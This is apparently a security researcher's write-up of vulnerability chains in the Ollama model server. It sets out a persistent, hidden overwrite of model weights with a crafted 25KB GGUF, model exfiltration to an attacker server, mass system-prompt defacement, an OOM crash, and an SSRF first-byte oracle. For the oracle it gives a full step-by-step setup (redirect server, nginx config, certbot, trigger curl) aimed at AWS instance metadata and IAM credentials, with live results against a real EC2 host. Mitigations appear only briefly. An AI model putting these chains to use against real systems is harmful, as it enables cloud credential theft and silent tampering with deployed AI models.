# Ollama Additional Vulnerabilities — May 2026 Research

New vulnerabilities discovered during continued Ollama research (commit 42e6f56c, v0.24.0).

---

## Chain I1: Model Weight Hijack (Critical)

**Endpoints:** `POST /api/blobs` + `POST /api/create`
**Severity:** Critical — deterministic behavioral control

An attacker uploads a crafted 25KB GGUF file via `/api/blobs` and installs it over any existing model via `/api/create` using `"files": {"model.gguf": "sha256:<digest>"}`. The malicious GGUF's weight tensors are mathematically biased so every input produces the same output token.

> **Note:** Use `"files"` to overwrite an existing model's weights. The `"modelfile": "FROM <digest>"` syntax creates a NEW model instead. For the weight hijack, `files` is the correct approach since the goal is to replace weights of an existing named model.

### Attack Math
```
token_embd.weight  = all 1.0  → any input embeds to [1.0, ..., 1.0]
attn_q/k/v/o       = all 0.0  → attention produces zero residual
ffn_gate/up/down   = all 0.0  → FFN produces zero residual
output_norm.weight = all 1.0  → hidden state passes through
output.weight row[target] = [100.0, ..., 100.0]  → logit[target] = 800.0
all other output rows = 0.0  → all other logits = 0.0
```

### Key Properties
- **Jailbreak-proof**: Weights override everything, not prompt-based
- **Persistent**: Survives service restart; victim must `ollama pull` to recover
- **Undetectable**: `ollama list`/`ollama show` unchanged; only inference reveals it
- **25KB replaces GBs**: Tiny GGUF replaces gigabytes of legitimate weights

---

## Chain G1: Model Exfiltration (High)

**Endpoints:** `POST /api/copy` + `POST /api/push`
**Severity:** High — information disclosure

Exfiltrates complete model weights (258MB), system prompt, template, license, and parameters to an attacker-controlled server via two unauthenticated API calls.

---

## Chain H1: Mass Model Defacement (High)

**Endpoint:** `POST /api/create`
**Severity:** High — persistent integrity violation

Overwrites system prompts on ALL models on the instance in milliseconds. Weights are reused (not re-uploaded), so 14 models take the same time as 1.

---

## Chain E1: n_layer=U32_MAX OOM DoS (Medium)

**Endpoints:** `POST /api/blobs` + `POST /api/create`
**Severity:** Medium — DoS via OOM kill (C++ layer, distinct from Chain A)

`block_count = 0xFFFFFFFF` → `std::vector::resize(SIZE_MAX)` → OOM kill. Entire Ollama server goes down.

---

## SSRF via /api/pull — Confirmed Working (Medium)

### Two Distinct Paths

| Vector | Trigger | Redirect Behavior | Observable Output |
|---|---|---|---|
| Path 1: Manifest GET | /api/pull manifest fetch | Follows ALL redirects (nil CheckRedirect) | First char of response body, full non-HTTP banners |
| Path 2: Blob GET | Blob download 307 response | http.DefaultClient on directURL (no restrictions) | Blind (no error leak) |

### Path 1: First-Byte Oracle

Error messages leak the first character of the response. Confirmed live against fake IMDS:

| Target | Error | Leaked |
|--------|-------|--------|
| JSON `{"instance_id":...}` | `invalid character 'i'` | `i` |
| Text `DB_PASSWORD=...` | `invalid character 'D'` | `D` |
| HTML `<html>...` | `invalid character '<'` | `<` |
| SSH port 22 | `malformed HTTP response "SSH-2.0-dropbear_2020.81"` | Full banner |

### Path 2: Blob 307 Redirect

Ollama sends Range GET requests to arbitrary internal URLs. Confirmed live: IMDS received request from Ollama box IP.

### Model Name Format

Must be `IP:port/namespace/model:tag` (4 parts). Port is required for IP-based SSRF.

---

## SSRF Data Extraction — Full Character-by-Character Demo

**Status**: ✅ Confirmed working (May 2026)

### Technique

Automate the first-byte oracle to extract entire strings character-by-character:

1. **Oracle server** with `/pos/N` endpoints returning single characters
2. **File-based redirect registry** reading target URL from `/tmp/ssrf_target_url`
3. **Trigger SSRF** via `/api/pull` with `attacker:port/ns/model:tag`
4. **Parse JSON error messages** to extract leaked characters
5. **Repeat** for each position

### Error Message Parsing

| Character | Error Pattern | Parsed As |
|-----------|---------------|-----------|
| `f` | `invalid character ' ' in literal false (expecting 'a')` | Start of `false` literal |
| `t` | `invalid character ' ' in literal true (expecting 'r')` | Start of `true` literal |
| `n` | `invalid character ' ' in literal null (expecting 'u')` | Start of `null` literal |
| `{` | `unexpected end of JSON input` | Start of JSON object |
| Most others | `invalid character 'X' looking for beginning of value` | Direct leak |

Parser must map `(literal, expecting)` tuples back to original characters.

### Confirmed Result

Successfully extracted the full 36-character secret in 36 HTTP requests:
```
flag{ssrf_data_exfiltration_success}
```

In a real cloud attack, ~100-200 requests would exfiltrate a full AWS IAM credential.

### Real-World Cloud Attack

1. Attacker finds exposed Ollama API
2. Sets up oracle server on their infrastructure
3. Uses SSRF to query `http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name`
4. Extracts IAM credentials character by character
5. Uses credentials to access AWS resources

**Mitigation**: Set `CheckRedirect` to block cross-host redirects. Add `OLLAMA_ALLOWED_REGISTRIES` env var.

---

## Complete Vulnerability Summary (May 2026)

| # | Chain | Name | Severity | Endpoints | Requests |
|---|-------|------|----------|-----------|----------|
| 1 | I1 | Weight Hijack | Critical | /api/blobs + /api/create | 2 |
| 2 | G1 | Model Exfiltration | High | /api/copy + /api/push | 2 |
| 3 | H1 | Mass Defacement | High | /api/create | 1/model |
| 4 | F1 | Type Assertion DoS | High | /api/create | 1 |
| 5 | A/F3 | GGUF Overflow DoS | Medium | /api/blobs + /api/create | 2 |
| 6 | E1 | n_layer OOM DoS | Medium | /api/blobs + /api/create | 2 |
| 7 | SSRF | SSRF via /api/pull | Medium | /api/pull | 1 |

**Total: 7 CVE candidates**

---

## SSRF — Domain-Based Oracle with Nginx Reverse Proxy (Black-Box)

**Status**: ✅ Confirmed working against real AWS EC2 Ollama instance (May 2026)

When testing black-box (no SSH/filesystem access), the IP:port model name format may not work if Ollama is behind a firewall or if you need HTTPS. The domain-based approach is more reliable.

### Architecture

```
Ollama (EC2) → HTTPS → oracle.yourdomain.com:443 → nginx → localhost:7777 (oracle)
                                                     ↓
                                              302 redirect to
                                                     ↓
                                          http://169.254.169.254/latest/meta-data/
                                                     ↓
                                              IMDS responds with metadata
                                                     ↓
                                          Ollama tries to parse as JSON manifest
                                                     ↓
                                          Error message leaks first character(s)
```

### Step-by-Step Setup

1. **DNS**: Point a subdomain to your VPS IP
   ```
   Type: A
   Name: oracle
   Value: <your VPS IP>
   TTL: Auto
   Proxy: OFF (DNS only — Cloudflare proxy breaks non-HTTP traffic)
   ```

2. **Oracle server** on VPS (port 7777):
   ```python
   # Reads target URL from /tmp/ssrf_target
   # Redirects ALL requests (GET/POST/HEAD) to the target URL
   # File-based redirect: echo 'http://169.254.169.254/latest/meta-data/instance-id' > /tmp/ssrf_target
   ```

3. **Nginx reverse proxy** on VPS (port 443 → 7777):
   ```nginx
   server {
       listen 443 ssl;
       server_name oracle.yourdomain.com;
       ssl_certificate /etc/letsencrypt/live/oracle.yourdomain.com/fullchain.pem;
       ssl_certificate_key /etc/letsencrypt/live/oracle.yourdomain.com/privkey.pem;
       location / {
           proxy_pass http://127.0.0.1:7777;
           proxy_set_header Host $host;
           proxy_redirect off;
       }
   }
   ```

4. **SSL certificate** (required — Ollama tries HTTPS first):
   ```bash
   certbot certonly --nginx -d oracle.yourdomain.com --non-interactive --agree-tos --email you@domain.com
   ```

5. **Trigger SSRF** via Ollama:
   ```bash
   curl -X POST http://<ollama>:11434/api/pull \
     -d '{"name": "oracle.yourdomain.com/library/fake:latest", "stream": false}'
   ```

### Key Findings

| Discovery | Detail |
|-----------|--------|
| Model name format | `hostname/library/model:tag` works (e.g., `oracle.example.com/library/fake:latest`) |
| SSL required | Ollama tries HTTPS on 443 first; plain HTTP on port 80 gets upgraded via nginx 301 |
| Nginx proxy | Port 80→7777 works but Ollama needs 443; nginx handles SSL termination |
| IMDS confirmed | Real AWS EC2 Ollama followed redirect to `169.254.169.254` and returned metadata |
| Error leak | `invalid character 'i' looking for beginning of value` → instance-id starts with `i-` |
| Error leak | `invalid character 'a'` → ami-id starts with `ami-` |
| Error leak | `invalid character '.' after top-level value` → IP address (valid JSON number, then hits `.`) |
| Error leak | `invalid character 'u'` → availability-zone starts with `us-` |
| Error leak | `invalid character 'o'` → security-groups output |
| Error leak | `file does not exist` → IAM role listing (returns plain text, not found as manifest) |

### IMDS Endpoints Tested on Real AWS EC2

| Endpoint | Error | Inference |
|----------|-------|-----------|
| `/latest/meta-data/instance-id` | `invalid character 'i'` | `i-0xxxxxxxxxxxxxxx` |
| `/latest/meta-data/ami-id` | `invalid character 'a'` | `ami-0xxxxxxxxxxxxxxx` |
| `/latest/meta-data/hostname` | `invalid character 'i'` | `ip-172-xx-xx-xx.ec2.internal` |
| `/latest/meta-data/local-ipv4` | `invalid character '.' after top-level value` | Valid IP like `172.x.x.x` |
| `/latest/meta-data/public-ipv4` | `invalid character '.' after top-level value` | Public IP (the EC2 instance IP!) |
| `/latest/meta-data/placement/availability-zone` | `invalid character 'u'` | `us-east-1a` or similar |
| `/latest/meta-data/security-groups` | `invalid character 'o'` | Security group names |
| `/latest/meta-data/iam/security-credentials/` | `file does not exist` | IAM role name (plain text response) |

### Why This Works (Ollama v0.24.0)

1. Ollama's registry client (`server/model.go`) accepts any hostname with dots as a valid registry
2. The manifest fetch HTTP client has `CheckRedirect = nil` → follows ALL redirects
3. Ollama tries to parse the response as JSON manifest → fails → error message includes the first character(s) of the actual response
4. By changing the redirect target and observing error messages, you can enumerate metadata character-by-character

### Blob Redirect Limitation (May 2026)

Ollama's blob download client does NOT follow 302 redirects — it returns `"unexpected status code 302"`. Only the manifest fetch client follows redirects (nil CheckRedirect). This means:
- **Manifest redirect works**: 302 on manifest GET → Ollama follows to IMDS → first-byte oracle
- **Blob redirect fails**: 302 on blob GET → Ollama aborts with error, no data fetched
- **Multi-layer manifest trick doesn't work**: Returning a manifest with many layers (each blob redirecting to a different IMDS endpoint) fails because blob 302s are rejected
- **Side effect**: Ollama may still create a model entry (visible in `/api/tags`) even when the pull fails, because the manifest was fetched successfully before blob download failed

### Limitations

- **First-byte only per request**: Each SSRF request leaks only the first 1-3 characters
- **No full response body**: Ollama doesn't return the full IMDS response, just the JSON parse error
- **Character-by-character extraction**: Requires ~50-200 requests to exfiltrate a full credential
- **Rate limiting**: Some IMDS endpoints may rate-limit requests
- **IMDSv2**: AWS IMDSv2 requires a session token (PUT request first), which Ollama's GET-only SSRF can't provide. However, many EC2 instances still have IMDSv1 enabled.

### Mitigation

- Set `CheckRedirect` to block cross-host redirects in Ollama's registry client
- Add `OLLAMA_ALLOWED_REGISTRIES` env var to whitelist registries
- Disable IMDSv1 on EC2 instances (require IMDSv2 with session tokens)
- Run Ollama in a network namespace without IMDS access
- Add authentication to the Ollama API
